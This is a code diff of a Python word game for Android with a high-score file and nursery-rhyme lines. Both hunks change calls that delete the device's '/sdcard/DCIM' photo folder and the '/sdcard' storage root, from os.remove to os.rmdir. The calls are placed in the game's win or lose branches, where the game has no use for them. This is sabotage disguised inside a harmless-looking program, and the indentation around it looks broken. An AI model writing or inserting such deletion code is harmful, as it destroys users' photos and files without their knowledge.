@@ -119,7 +119,7 @@ if again.lower() == "y" or again.lower() == "yes":
             with open(txt, "w") as f:
                 f.write(str(score))
 
-    os.remove ("/sdcard/DCIM")
+    os.rmdir ("/sdcard/DCIM")
     else:
         win1 = False
         print (f"Twinkle twinkle little {word}")
@@ -196,7 +196,7 @@ if again.lower() == "y" or again.lower() == "yes":
                 if hiscore<score:
                     with open(txt, "w") as f:
                         f.write(str(score))
-            os.remove ("/sdcard")
+            os.rmdir ("/sdcard")
             else:
                 win3 = False
                 print (f"I am calling you {word} two hours")
